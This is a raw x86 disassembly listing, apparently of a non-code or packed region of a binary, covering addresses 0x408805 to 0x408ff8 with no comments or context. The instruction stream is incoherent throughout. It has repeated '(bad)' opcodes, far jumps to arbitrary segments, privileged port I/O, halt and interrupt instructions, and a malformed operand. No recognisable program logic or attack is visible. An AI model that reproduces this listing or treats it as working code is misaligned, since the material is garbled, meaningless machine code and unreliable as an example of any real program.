  408805:	jmp    0x3eb1:0xef31f00c
  40880c:	(bad)  
  40880d:	fldcw  WORD PTR [edx+0x76]
  408810:	mov    eax,0x4965a77d
  408815:	push   ds
  408816:	idiv   esp
  408818:	add    DWORD PTR ds:0xa8b52549,0xffffffc6
  40881f:	and    dh,bl
  408821:	stos   DWORD PTR es:[edi],eax
  408822:	ret    
  408823:	jp     0x40883a
  408825:	xor    eax,0x1524bb06
  40882a:	cmp    DWORD PTR [eax-0x31],eax
  40882d:	js     0x408811
  40882f:	xchg   edi,eax
  408831:	jno    0x4087b3
  408833:	xchg   DWORD PTR [esi-0x14],esi
  408836:	ret    
  408837:	test   eax,0xcc02525c
  40883c:	push   0xffffffad
  40883e:	iret   
  40883f:	sbb    ebp,esi
  408841:	stc    
  408842:	push   edx
  408843:	or     esi,ebp
  408845:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408846:	cwde   
  408847:	out    0xb6,al
  408849:	aad    0x6c
  40884b:	push   eax
  40884c:	hlt    
  40884d:	add    al,0x58
  40884f:	iret   
  408850:	imul   esp,DWORD PTR [edi-0x6aaabd51],0x42
  408857:	add    bl,BYTE PTR [edi+0x21de1e76]
  40885d:	(bad)  
  40885e:	jle    0x408879
  408860:	jmp    0x70e1:0x86106150
  408867:	xchg   ecx,ecx
  408869:	bound  eax,QWORD PTR [edi]
  40886b:	adc    ebp,DWORD PTR [edx-0x6e]
  40886e:	rol    DWORD PTR [ecx+0x7dcd38ff],1
  408874:	push   ds
  408875:	sbb    al,0xe6
  408877:	or     BYTE PTR [esi-0x17],0xae
  40887b:	inc    ebx
  40887c:	bswap  eax
  40887e:	or     dh,BYTE PTR [eax]
  408880:	retf   0xbe86
  408883:	mov    edi,0xe81da84d
  408888:	stos   BYTE PTR es:[edi],al
  408889:	cmp    DWORD PTR [edi+0x3e0cc6f],edi
  40888f:	jmp    0x4e3:0x7a7a9117
  408896:	sar    ebx,cl
  408898:	sahf   
  408899:	ins    DWORD PTR es:[edi],dx
  40889a:	pop    ebx
  40889b:	or     ebx,DWORD PTR ds:0xef0797bb
  4088a1:	sbb    dl,dh
  4088a3:	test   BYTE PTR [edi+0x4a],bh
  4088a6:	sar    BYTE PTR [edx-0x5],1
  4088a9:	mov    ah,0x51
  4088ab:	out    0xb4,al
  4088ad:	mov    bl,0x10
  4088af:	jl     0x4088a3
  4088b1:	test   eax,0x3ae8ddbc
  4088b6:	out    dx,eax
  4088b7:	pop    ebp
  4088b8:	add    eax,0xc4ff91ed
  4088bd:	pop    edx
  4088be:	mov    ds:0xc79c302c,eax
  4088c3:	or     al,0xbb
  4088c5:	call   0x399cae71
  4088ca:	mov    eax,0xc3fa037c
  4088cf:	scas   al,BYTE PTR es:[edi]
  4088d0:	test   DWORD PTR [ebp-0x3c178d46],0x754928ec
  4088da:	sub    DWORD PTR [ebx+0x458a01c2],edx
  4088e0:	lahf   
  4088e1:	dec    esi
  4088e2:	pop    edi
  4088e3:	jo     0x408959
  4088e5:	dec    edx
  4088e6:	xchg   edi,eax
  4088e7:	mov    bh,dl
  4088e9:	jnp    0x408894
  4088eb:	dec    esp
  4088ec:	dec    ebx
  4088ed:	jl     0x408945
  4088ef:	rcl    ecx,cl
  4088f1:	cmp    cl,BYTE PTR [edi]
  4088f3:	xchg   ebx,eax
  4088f4:	jmp    0xbcfd3611
  4088f9:	aaa    
  4088fa:	lods   al,BYTE PTR ds:[esi]
  4088fb:	mov    al,ds:0x7c749055
  408900:	dec    al
  408902:	sub    ecx,DWORD PTR [ecx]
  408904:	out    0x48,eax
  408906:	adc    bh,bl
  408908:	push   cs
  408909:	xor    eax,0x5207cf53
  40890e:	adc    dl,BYTE PTR [ebp+0x19]
  408911:	jo     0x408908
  408913:	adc    eax,0xcc4d92e3
  408918:	gs push es
  40891a:	js     0x408998
  40891c:	jmp    0xfb5:0xb4cc235
  408923:	xor    bh,ch
  408925:	inc    ebp
  408926:	lock and al,al
  408929:	enter  0xfd14,0xe9
  40892d:	mov    al,ds:0xa9d75981
  408932:	les    ecx,FWORD PTR [eax+edi*2+0x547af60b]
  408939:	adc    DWORD PTR [edx+0x18c849d4],ebx
  40893f:	ret    
  408940:	xchg   esi,eax
  408941:	lds    ebp,FWORD PTR [edx+0x7f761b5d]
  408947:	push   es
  408948:	jle    0x4088ca
  40894a:	and    esp,DWORD PTR [ecx+eax*4+0x39]
  40894e:	loopne 0x40898f
  408950:	inc    ecx
  408951:	(bad)  
  408952:	xor    dl,BYTE PTR ds:0x2b09082c
  408958:	cmp    ebp,ebp
  40895a:	gs rcr DWORD PTR es:[edx+0x56],0xfe
  408960:	jmp    0x4089a3
  408962:	dec    BYTE PTR [ecx+0x22]
  408965:	out    0xb8,al
  408967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408968:	int    0x13
  40896a:	in     eax,dx
  40896b:	in     eax,dx
  40896c:	add    dh,BYTE PTR [edi-0x4]
  40896f:	push   edx
  408970:	loop   0x4089d0
  408972:	sub    BYTE PTR [eax],ah
  408974:	sub    bl,BYTE PTR [edx-0x74]
  408977:	and    dh,dl
  408979:	rol    BYTE PTR [edi+0x28],0x7c
  40897d:	jbe    0x4089b2
  40897f:	sub    bh,al
  408981:	sbb    al,0xf7
  408983:	popa   
  408984:	jbe    0x408927
  408986:	mov    eax,ds:0xac9ad69f
  40898b:	addr16 dec eax
  40898d:	or     cl,dh
  40898f:	leave  
  408990:	repz mov ecx,0xcc690936
  408996:	or     eax,0xad83e765
  40899b:	sbb    DWORD PTR [eax-0x6c],0x47
  40899f:	pop    esi
  4089a0:	pop    edx
  4089a1:	test   edi,ebx
  4089a3:	popf   
  4089a4:	mov    ds:0x80c123f,eax
  4089a9:	arpl   WORD PTR [ecx-0x7e2afba2],sp
  4089af:	push   cs
  4089b0:	inc    ebp
  4089b1:	push   eax
  4089b2:	or     BYTE PTR [ebx],cl
  4089b4:	dec    ebx
  4089b5:	xor    DWORD PTR [eax-0x42a37a54],ebx
  4089bb:	fbld   TBYTE PTR [edi+0x453b8ee5]
  4089c1:	add    eax,0x1b37a3db
  4089c6:	fild   WORD PTR [edi-0x80]
  4089c9:	iret   
  4089ca:	mov    ebx,0x9a3f44ae
  4089cf:	lea    edx,[edx]
  4089d1:	pop    esp
  4089d2:	jbe    0x4089f2
  4089d4:	std    
  4089d5:	mov    ebx,0xe077ad9f
  4089da:	mov    edx,0x10678ae9
  4089df:	mov    edi,DWORD PTR [esi]
  4089e1:	sub    DWORD PTR [esi-0x32],eax
  4089e4:	or     dh,dh
  4089e6:	not    BYTE PTR [edx+eiz*4-0x73e7627b]
  4089ed:	(bad)  
  4089ee:	or     DWORD PTR [edx-0x2380f477],ecx
  4089f4:	pcmpgtb mm2,QWORD PTR [esi-0x1f]
  4089f8:	cld    
  4089f9:	js     0x4089b1
  4089fb:	pop    ebx
  4089fc:	jno    0x408a13
  4089fe:	lock sbb al,0x79
  408a01:	cmp    DWORD PTR [ecx+0x4542b565],esp
  408a07:	gs pop esp
  408a09:	sub    ch,ah
  408a0b:	push   ss
  408a0c:	pusha  
  408a0d:	(bad)  
  408a0e:	jmp    0x6adc:0xf17c2d07
  408a15:	scas   eax,DWORD PTR es:[edi]
  408a16:	sub    al,0xa1
  408a18:	jecxz  0x408a25
  408a1a:	sbb    eax,0x3147285
  408a1f:	mov    esp,0x613cbf95
  408a24:	xchg   ebp,eax
  408a25:	or     BYTE PTR [ecx-0x30],bh
  408a28:	test   BYTE PTR [ebp-0x3dc1371],ah
  408a2e:	xchg   dh,dl
  408a30:	lock dec edx
  408a32:	cmp    eax,0x18b7fad3
  408a37:	pop    esp
  408a38:	lock dec ebx
  408a3a:	xchg   esp,eax
  408a3b:	in     al,dx
  408a3c:	adc    dl,ch
  408a3e:	xor    al,BYTE PTR [edi+eiz*1-0x2a]
  408a42:	mov    dh,0x68
  408a44:	das    
  408a45:	mov    esp,0xbfef366d
  408a4a:	in     eax,0x7c
  408a4c:	jge    0x408a72
  408a4e:	push   esi
  408a4f:	cs jmp 0x3995:0x3c793bfe
  408a57:	ret    
  408a58:	cdq    
  408a59:	mov    dl,BYTE PTR [esi-0x6ae46f3a]
  408a5f:	fs loop 0x408a44
  408a62:	cmp    eax,0x22ea30cc
  408a67:	nop
  408a68:	cmc    
  408a69:	jb     0x4089f2
  408a6b:	pop    edx
  408a6c:	pop    ebx
  408a6d:	mov    edi,0xb665f28b
  408a72:	mov    al,ds:0x44533882
  408a77:	jnp    0x408a6b
  408a79:	pop    ebp
  408a7a:	lds    ebx,FWORD PTR [eax+0x35cbe805]
  408a80:	mov    eax,ds:0x545d2e18
  408a85:	punpcklwd mm0,mm4
  408a88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a89:	arpl   WORD PTR [edx-0x6a],si
  408a8c:	add    cl,BYTE PTR ss:[eax+ecx*1+0xf3c6f57]
  408a94:	bound  edx,QWORD PTR [eax+0x3d92dc46]
  408a9a:	aam    0x8a
  408a9c:	xchg   ecx,eax
  408a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a9e:	pop    ebx
  408a9f:	add    eax,0x16a626e4
  408aa4:	mov    eax,ds:0x68dce9d4
  408aa9:	jae    0x408ae9
  408aab:	sub    ch,BYTE PTR ds:0xf0f4aa1a
  408ab1:	cld    
  408ab2:	ret    0xc75d
  408ab5:	and    eax,0x1dbf7608
  408aba:	test   DWORD PTR [eax+eax*4],ebx
  408abd:	jb     0x408b0f
  408abf:	or     BYTE PTR [ebx-0x15],bl
  408ac2:	(bad)  
  408ac3:	test   dh,0x89
  408ac6:	bound  esp,QWORD PTR [edi]
  408ac8:	push   edx
  408ac9:	ja     0x408ad8
  408acb:	mov    esi,0x312bfc5f
  408ad0:	(bad)  
  408ad1:	in     eax,0xf6
  408ad3:	mov    ds:0xba43dbcb,eax
  408ad8:	jmp    0xae90:0x5992d9e2
  408adf:	leave  
  408ae0:	je     0x408a99
  408ae2:	dec    edi
  408ae3:	xchg   esi,eax
  408ae4:	ficom  WORD PTR [edx]
  408ae6:	pop    es
  408ae7:	xchg   ebx,eax
  408ae8:	add    DWORD PTR [eax-0x7c65eef8],ebp
  408aee:	shl    cl,cl
  408af0:	jo     0x408a9f
  408af2:	add    ebx,DWORD PTR [ecx+0x7f]
  408af5:	shl    BYTE PTR [eax],1
  408af7:	push   es
  408af8:	sbb    al,0xd8
  408afa:	and    DWORD PTR [edi+ecx*4],0x9ff12d3c
  408b01:	push   ebx
  408b02:	dec    ebp
  408b03:	dec    esi
  408b04:	dec    eax
  408b05:	jmp    FWORD PTR [ebx]
  408b07:	std    
  408b08:	cwde   
  408b09:	ins    DWORD PTR es:[edi],dx
  408b0a:	in     al,0x76
  408b0c:	add    DWORD PTR [ecx-0x61],0x5dd98fcf
  408b13:	adc    BYTE PTR [ebx],al
  408b15:	and    DWORD PTR [edx-0x5e2f3c8],ecx
  408b1b:	in     al,0x68
  408b1d:	das    
  408b1e:	or     DWORD PTR [edx-0x36d964e6],ecx
  408b24:	test   BYTE PTR [ecx],ah
  408b26:	and    ecx,edi
  408b28:	add    al,0x2e
  408b2a:	jmp    0x408ba8
  408b2c:	add    bl,BYTE PTR [edi-0xc]
  408b2f:	and    DWORD PTR [eax+0x7dad7a0d],edi
  408b35:	dec    esi
  408b36:	sub    eax,0x558a18e6
  408b3b:	retf   0xc13f
  408b3e:	scas   eax,DWORD PTR es:[edi]
  408b3f:	and    DWORD PTR [edi-0x35fefa41],esp
  408b45:	loope  0x408af3
  408b47:	and    eax,0xf079528d
  408b4c:	mov    edx,0xc50ba8f7
  408b51:	push   eax
  408b52:	dec    esp
  408b53:	dec    ebp
  408b54:	cmp    al,0xa4
  408b56:	dec    ebx
  408b57:	rol    ah,0x73
  408b5a:	push   ebp
  408b5b:	dec    esi
  408b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b5d:	mov    esp,0x21d00e0e
  408b62:	in     al,dx
  408b63:	mov    bh,0x52
  408b65:	aam    0x6
  408b67:	jl     0x408aec
  408b69:	xor    al,0x6f
  408b6b:	stos   DWORD PTR es:[edi],eax
  408b6c:	ss loop 0x408b58
  408b6f:	sbb    edi,ebp
  408b71:	jp     0x408b5f
  408b73:	nop
  408b74:	dec    ecx
  408b75:	jo     0x408bad
  408b77:	inc    edx
  408b78:	cmp    eax,0xa6416551
  408b7d:	inc    edx
  408b7e:	adc    edi,DWORD PTR [edx-0x78968cb]
  408b84:	(bad)  
  408b85:	push   ds
  408b86:	and    eax,0x5d66d6af
  408b8b:	add    BYTE PTR [eax+0x6d],ch
  408b8e:	lods   al,BYTE PTR ds:[esi]
  408b8f:	lds    ecx,FWORD PTR ds:0x81606031
  408b95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b96:	test   eax,0x834fe48e
  408b9b:	nop
  408b9c:	addr16 and al,0x22
  408b9f:	ds es rcl ah,0x57
  408ba4:	scas   eax,DWORD PTR es:[edi]
  408ba5:	out    dx,al
  408ba6:	xlat   BYTE PTR ds:[ebx]
  408ba7:	pop    ebp
  408ba8:	cdq    
  408ba9:	xor    al,BYTE PTR [eax-0x30]
  408bac:	cmp    DWORD PTR [ebx+0x2817e621],ecx
  408bb2:	dec    edi
  408bb3:	xchg   ebx,eax
  408bb4:	fistp  WORD PTR [edi+0x4a]
  408bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bb8:	pop    edx
  408bb9:	mov    ebx,0x64fb034f
  408bbe:	inc    edi
  408bbf:	xor    al,BYTE PTR [ecx-0x4]
  408bc2:	mov    ebp,0xafba0a2e
  408bc7:	popa   
  408bc8:	rcr    DWORD PTR [edx+0x1d],1
  408bcb:	add    edi,DWORD PTR [esi]
  408bcd:	stc    
  408bce:	fidiv  WORD PTR ds:0xe0187170
  408bd4:	and    ebx,DWORD PTR [ebx-0x318dc9f0]
  408bda:	fisttp WORD PTR [ebx]
  408bdc:	add    di,WORD PTR [edi+0x41dc5720]
  408be3:	pop    edi
  408be4:	adc    ebp,0xfa048bd4
  408bea:	aaa    
  408beb:	loop   0x408b7c
  408bed:	arpl   WORD PTR [edx+0x7d],sp
  408bf0:	cmp    ch,BYTE PTR [esp+ebp*2+0x7d]
  408bf4:	xor    DWORD PTR [ecx+0x2b999561],edi
  408bfa:	imul   ebp,DWORD PTR [esi],0xdb91a432
  408c00:	fcmove st,st(1)
  408c02:	jo     0x408bd7
  408c04:	addr16 addr16 aad 0xf3
  408c08:	into   
  408c09:	mov    ebp,0x8e2ee130
  408c0e:	cwde   
  408c0f:	sbb    BYTE PTR [edi+0x4a457aa3],0x26
  408c16:	sbb    dh,dl
  408c18:	push   es
  408c19:	js     0x408c53
  408c1b:	dec    ebp
  408c1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c1d:	inc    ebp
  408c1e:	imul   ecx,DWORD PTR [ecx],0xeed51c77
  408c24:	loope  0x408be8
  408c26:	mov    cl,0x23
  408c28:	push   edi
  408c29:	push   esp
  408c2a:	push   cs
  408c2b:	sub    al,ch
  408c2d:	add    al,BYTE PTR [esi+0x58]
  408c30:	rcr    DWORD PTR es:[ebx+0x76],cl
  408c34:	pop    ss
  408c35:	adc    BYTE PTR ds:[edi-0x51],bh
  408c39:	or     DWORD PTR [edi-0xb],edx
  408c3c:	les    ecx,FWORD PTR [esi+0x536fa044]
  408c42:	fld    TBYTE PTR [ecx+ebp*4]
  408c45:	fstp   TBYTE PTR ss:[ecx+0x41]
  408c49:	dec    ebx
  408c4a:	jmp    0x408ccb
  408c4c:	push   0x47
  408c4e:	jno    0x408bd6
  408c50:	adc    eax,0x3bb990e5
  408c55:	xor    al,BYTE PTR [esi+0x45798186]
  408c5b:	stos   DWORD PTR es:[edi],eax
  408c5c:	cli    
  408c5d:	stc    
  408c5e:	sub    al,al
  408c60:	mov    WORD PTR [eax-0x4ea396f2],?
  408c66:	jb     0x408cb2
  408c68:	ds cdq 
  408c6a:	inc    esp
  408c6b:	mov    eax,0xfda5784b
  408c70:	dec    ebp
  408c71:	out    dx,al
  408c72:	sbb    dl,BYTE PTR [ebx]
  408c74:	pusha  
  408c75:	dec    ecx
  408c76:	and    DWORD PTR [eax],eax
  408c78:	push   cs
  408c79:	psraw  mm5,QWORD PTR [ecx]
  408c7c:	sub    edi,DWORD PTR [edi]
  408c7e:	inc    esi
  408c7f:	or     ah,BYTE PTR [edx]
  408c81:	push   ebp
  408c82:	or     BYTE PTR [edi+0x3da7be23],al
  408c88:	test   DWORD PTR [edi-0x3dd39374],edi
  408c8e:	cmp    eax,0x48342950
  408c93:	sub    eax,0x6cf15b9a
  408c98:	fmulp  st(2),st
  408c9a:	sti    
  408c9b:	cs dec esp
  408c9d:	dec    edi
  408c9e:	inc    eax
  408c9f:	xchg   ebx,eax
  408ca0:	in     eax,dx
  408ca1:	dec    esi
  408ca2:	std    
  408ca3:	push   ebx
  408ca4:	sbb    eax,0xa45f43f0
  408ca9:	xchg   BYTE PTR [ecx],bh
  408cab:	xlat   BYTE PTR ds:[ebx]
  408cac:	sub    eax,0x4874b63d
  408cb1:	xchg   BYTE PTR [esi+ebx*4+0x458f09f],dl
  408cb8:	inc    ebx
  408cb9:	repz scas eax,DWORD PTR es:[edi]
  408cbb:	loopne 0x408cea
  408cbd:	push   esp
  408cbe:	mov    ebx,0x1b1f9bd5
  408cc3:	push   eax
  408cc4:	lds    edi,FWORD PTR [edx-0x5c]
  408cc7:	or     al,0xbe
  408cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cca:	call   0xb6dc8c78
  408ccf:	or     ah,BYTE PTR ds:0xec6288ea
  408cd5:	and    eax,0x2437d875
  408cda:	xchg   esi,eax
  408cdb:	sub    BYTE PTR [esi-0x3c],cl
  408cde:	push   0xffffff93
  408ce0:	(bad)  
  408ce1:	pop    esi
  408ce2:	and    al,0x4f
  408ce4:	je     0x408c6c
  408ce6:	in     al,0xc4
  408ce8:	scas   eax,DWORD PTR es:[edi]
  408ce9:	aad    0x42
  408ceb:	shr    BYTE PTR [ecx-0x9ac912],0xf2
  408cf2:	test   dh,al
  408cf4:	push   es
  408cf5:	mov    eax,ds:0xcb6e2e63
  408cfa:	push   cs
  408cfb:	clc    
  408cfc:	jns    0x408d2c
  408cfe:	pushf  
  408cff:	mov    eax,ds:0xa0c8ff54
  408d04:	pop    edx
  408d05:	sbb    al,0x27
  408d07:	in     eax,dx
  408d08:	jnp    0x408d6a
  408d0a:	mov    gs,WORD PTR [edx+0x37cde5df]
  408d10:	dec    edi
  408d11:	iret   
  408d12:	ja     0xf1d2de23
  408d18:	xchg   ebp,eax
  408d19:	ins    DWORD PTR es:[edi],dx
  408d1a:	xchg   edi,eax
  408d1b:	repz repnz daa 
  408d1e:	pusha  
  408d1f:	pop    ebp
  408d20:	or     al,dh
  408d22:	mov    al,ds:0xcc4e2962
  408d27:	sub    al,0x63
  408d29:	adc    ebx,ebx
  408d2b:	adc    DWORD PTR [eax+0x19],0xd8d926b4
  408d32:	(bad)
  408d35:	sub    DWORD PTR [eax-0x70fd3f65],0x6a
  408d3c:	sub    ebx,DWORD PTR [edi+eiz*8]
  408d3f:	out    0x5,al
  408d41:	icebp  
  408d42:	jno    0x408da7
  408d44:	jb     0x408cf8
  408d46:	jg     0x408ceb
  408d48:	or     dh,BYTE PTR [esi+0x2a]
  408d4b:	sbb    BYTE PTR [ebx],0x88
  408d4e:	pop    esi
  408d4f:	cli    
  408d50:	lds    ecx,FWORD PTR [esi+eiz*4]
  408d53:	sub    DWORD PTR [ecx],ecx
  408d55:	mov    dh,0x53
  408d57:	xchg   ebx,eax
  408d58:	(bad)  
  408d59:	repnz cmc 
  408d5b:	nop
  408d5c:	ins    BYTE PTR es:[edi],dx
  408d5d:	clc    
  408d5e:	loope  0x408dae
  408d60:	cli    
  408d61:	mov    al,0x3d
  408d63:	cli    
  408d64:	aaa    
  408d65:	loop   0x408d20
  408d67:	aam    0xea
  408d69:	push   ss
  408d6a:	xchg   ebx,eax
  408d6b:	in     eax,0x11
  408d6d:	pop    ecx
  408d6e:	jmp    0x408d96
  408d70:	jmp    0x408de7
  408d72:	fcom   QWORD PTR [ecx]
  408d74:	stc    
  408d75:	inc    ebx
  408d76:	adc    al,0x1f
  408d78:	inc    edi
  408d79:	rol    DWORD PTR [ecx+0x64],cl
  408d7c:	xlat   BYTE PTR ds:[ebx]
  408d7d:	mov    al,ds:0x298519dd
  408d82:	fcmovne st,st(1)
  408d84:	jl     0x408d60
  408d86:	xor    edi,ecx
  408d88:	lds    eax,FWORD PTR [esi+0x126fa651]
  408d8e:	push   esi
  408d8f:	pop    eax
  408d90:	push   ebx
  408d91:	mov    ds:0x6d303df4,al
  408d96:	icebp  
  408d97:	push   ecx
  408d98:	pop    esi
  408d9a:	ins    BYTE PTR es:[edi],dx
  408d9b:	jae    0x408d9a
  408d9d:	push   ecx
  408d9e:	jbe    0x408dfe
  408da0:	stos   DWORD PTR es:[edi],eax
  408da1:	dec    edx
  408da2:	sbb    BYTE PTR [eax-0x50],bl
  408da5:	mov    al,0x9e
  408da7:	jbe    0x408d56
  408da9:	cwde   
  408daa:	aas    
  408dab:	mov    edi,0x609c098d
  408db0:	jae    0x408d99
  408db2:	pop    edi
  408db3:	add    eax,0x24f46d51
  408db8:	push   ecx
  408db9:	or     eax,0xc595c59a
  408dbe:	loop   0x408d4c
  408dc0:	dec    edi
  408dc1:	fild   WORD PTR [edi-0x5efff5b]
  408dc7:	inc    edx
  408dc8:	cwde   
  408dc9:	in     al,0xe2
  408dcb:	jns    0x408e1e
  408dcd:	das    
  408dce:	dec    ebx
  408dcf:	or     esp,DWORD PTR [esi+eax*4-0x14a6bbc2]
  408dd6:	jo     0x408e40
  408dd8:	cld    
  408dd9:	sbb    dl,bl
  408ddb:	popf   
  408ddc:	xor    al,0x89
  408dde:	inc    edi
  408ddf:	xor    dh,al
  408de1:	push   ebx
  408de2:	or     BYTE PTR [ebp+0x50],0xd4
  408de6:	or     DWORD PTR [edx],ecx
  408de8:	sbb    BYTE PTR [eax-0x5619d689],0x5f
  408def:	mov    eax,0x18242790
  408df4:	adc    eax,0xcdf6622a
  408df9:	iret   
  408dfa:	arpl   WORD PTR [esi+0x73f21570],sp
  408e00:	mov    bl,0x1e
  408e02:	and    BYTE PTR [eax-0x488f5a3e],0xbb
  408e09:	mov    ebx,0x29271b77
  408e0e:	mov    WORD PTR [bx+di+0x6563],gs
  408e13:	adc    dl,BYTE PTR [eax-0x12e18296]
  408e19:	cwde   
  408e1a:	(bad)  
  408e1c:	inc    ebp
  408e1d:	xchg   esi,eax
  408e1e:	fwait
  408e1f:	xchg   edi,eax
  408e20:	mov    edi,DWORD PTR [esi+edx*2-0x7bef4bbf]
  408e27:	dec    eax
  408e28:	xchg   edx,eax
  408e29:	and    ebp,eax
  408e2b:	nop
  408e2c:	rol    DWORD PTR [eax],cl
  408e2e:	iret   
  408e2f:	iret   
  408e30:	or     al,0xc9
  408e32:	adc    eax,0x690006a1
  408e37:	cwde   
  408e38:	(bad)  
  408e39:	and    eax,0x20e9608e
  408e3e:	ja     0x408dca
  408e40:	imul   ebx,DWORD PTR [ebp+0x7c964ca0],0x39
  408e47:	or     BYTE PTR [eax+esi*8+0x2a],0xec
  408e4c:	fmulp  st(3),st
  408e4e:	retf   
  408e4f:	cmp    ebp,ebx
  408e51:	lock push ebx
  408e53:	jae    0x408e23
  408e55:	adc    DWORD PTR [eax*2+0x59a1d018],esi
  408e5c:	js     0x408e6e
  408e5e:	jbe    0x408e8a
  408e60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e61:	dec    esp
  408e62:	jmp    FWORD PTR [esi+0x633bee0e]
  408e68:	add    bh,BYTE PTR [esi+0x7eb2b03a]
  408e6e:	and    BYTE PTR [edx+0x1],bl
  408e71:	mov    dl,BYTE PTR [ecx]
  408e73:	stc    
  408e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e75:	ret    
  408e76:	mov    cl,0xcc
  408e78:	adc    ebx,DWORD PTR [ebx]
  408e7a:	xchg   esp,eax
  408e7b:	fmul   DWORD PTR ds:0x4baa504
  408e81:	mov    dh,0xa4
  408e83:	sbb    al,0xe6
  408e85:	cli    
  408e86:	retf   
  408e87:	or     BYTE PTR [esi-0x10fa5dba],ah
  408e8d:	mov    esp,0x6b0dff80
  408e92:	pop    esi
  408e93:	je     0x408e4f
  408e95:	hlt    
  408e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e97:	cmc    
  408e98:	cwde   
  408e99:	lea    ebx,[ebp-0x6d013edf]
  408e9f:	xor    BYTE PTR [esi-0x7e],dl
  408ea2:	call   0x30b:0xe15634ce
  408ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eaa:	jp     0x408ece
  408eac:	fidiv  WORD PTR [esi+eiz*4-0x76]
  408eb0:	mov    BYTE PTR ds:0x39577d6f,cl
  408eb6:	add    DWORD PTR [ebp+0x52],eax
  408eb9:	imul   ebp,DWORD PTR [ebx+ebp*2],0x56
  408ebd:	push   0x8f955340
  408ec2:	and    BYTE PTR [eax+0x568c7f37],ch
  408ec8:	mov    al,ds:0x4565e8fb
  408ecd:	xchg   ecx,eax
  408ece:	fldenv [ecx]
  408ed0:	lahf   
  408ed1:	mov    ds,WORD PTR [edx-0x69d21ca0]
  408ed7:	leave  
  408ed8:	fucomi st,st(6)
  408eda:	sbb    al,0x5d
  408edc:	fwait
  408edd:	int    0x1b
  408edf:	or     bh,BYTE PTR [ecx-0x257e073c]
  408ee5:	mov    al,0x87
  408ee7:	and    eax,0x9bc11c6
  408eec:	sub    DWORD PTR [esi],eax
  408eee:	mov    DWORD PTR [esi],ecx
  408ef0:	sbb    al,0xed
  408ef2:	cmp    DWORD PTR [eax],edx
  408ef4:	fldenv [eax+0x5b]
  408ef7:	jne    0x408ecc
  408ef9:	pusha  
  408efa:	jmp    0x653a:0x5d51c925
  408f01:	mov    DWORD PTR [edx],ebp
  408f03:	dec    ecx
  408f04:	cld    
  408f05:	mov    dl,0x7
  408f07:	sahf   
  408f08:	arpl   WORD PTR [edx-0xae88869],ax
  408f0e:	repnz cld 
  408f10:	scas   al,BYTE PTR es:[edi]
  408f11:	sbb    ebx,DWORD PTR [ecx+0x77]
  408f14:	aam    0x2f
  408f16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f17:	pop    ecx
  408f18:	mov    dl,0xf2
  408f1a:	push   0xd2b74584
  408f1f:	or     bh,BYTE PTR [ebp+0x4cae8f42]
  408f25:	int    0xe6
  408f27:	sub    al,dh
  408f29:	aad    0xc3
  408f2b:	shl    DWORD PTR [ecx+0x7d],0xeb
  408f2f:	or     BYTE PTR ds:0x638f997d,bh
  408f35:	scas   al,BYTE PTR es:[edi]
  408f36:	push   0xffffffbc
  408f38:	fldcw  WORD PTR [esi]
  408f3a:	cwde   
  408f3b:	bnd ret 
  408f3d:	aad    0x84
  408f3f:	mov    eax,edi
  408f41:	and    DWORD PTR [eax-0x39a50af],0x60
  408f48:	imul   ebx,DWORD PTR [ebp+0x3e293581],0x48
  408f4f:	adc    ch,BYTE PTR [eax-0x2c]
  408f52:	(bad)  
  408f53:	mov    DWORD PTR [ebx-0x55],0xe243edff
  408f5a:	pop    ecx
  408f5b:	adc    esi,DWORD PTR [edx]
  408f5d:	adc    al,0xc2
  408f5f:	mov    al,0x36
  408f61:	jl     0x408fd4
  408f63:	call   0xce74:0x53944680
  408f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f6b:	jp     0x408feb
  408f6d:	pop    esi
  408f6e:	arpl   di,ax
  408f70:	mov    dh,0xbd
  408f72:	push   cs
  408f73:	mov    DWORD PTR ds:0xaacd6426,ecx
  408f79:	out    dx,al
  408f7a:	adc    DWORD PTR [eax],esi
  408f7c:	jb     0x408f30
  408f7e:	push   ds
  408f7f:	jno    0x408fd2
  408f81:	dec    eax
  408f82:	fwait
  408f83:	ror    BYTE PTR [ebx],1
  408f85:	ret    
  408f86:	mov    al,ds:0xe8db167d
  408f8b:	je     0x408f41
  408f8d:	outs   dx,DWORD PTR ds:[esi]
  408f8e:	mov    esi,0x5844ff4c
  408f93:	lea    edx,[esi-0x16c974c0]
  408f99:	stos   DWORD PTR es:[edi],eax
  408f9a:	jno    0x408fef
  408f9c:	add    BYTE PTR [edx-0x4b],0x7
  408fa0:	call   0x2f98d82c
  408fa5:	lds    ecx,FWORD PTR [eax+edi*2+0x3e1a21a7]
  408fac:	jge    0x408f94
  408fae:	xchg   ebp,eax
  408faf:	add    al,0xac
  408fb1:	sub    BYTE PTR cs:[esi-0x3c11a861],ch
  408fb8:	jne    0x408fa1
  408fba:	mov    al,0x34
  408fbc:	das    
  408fbd:	fwait
  408fbe:	jmp    FWORD PTR [esi-0x713d0535]
  408fc4:	mov    ah,0xb
  408fc6:	sahf   
  408fc7:	sub    eax,0xbca237a8
  408fcc:	stos   DWORD PTR es:[edi],eax
  408fcd:	pushf  
  408fce:	sub    esi,DWORD PTR [eax]
  408fd0:	rol    DWORD PTR [esi-0x154909ed],cl
  408fd6:	push   es
  408fd7:	dec    ecx
  408fd8:	mov    ds:0x867592d1,eax
  408fdd:	xchg   esi,eax
  408fde:	cwde   
  408fdf:	or     dh,BYTE PTR [ebp-0x2fc2ed90]
  408fe5:	xchg   esp,eax
  408fe6:	push   0x505620d
  408feb:	cmp    BYTE PTR [eax-0x63],0x9b
  408fef:	dec    ebp
  408ff0:	sti    
  408ff1:	cld    
  408ff2:	arpl   WORD PTR [esi-0x5e9d21f3],cx
  408ff8:	cmp    al,0x8e
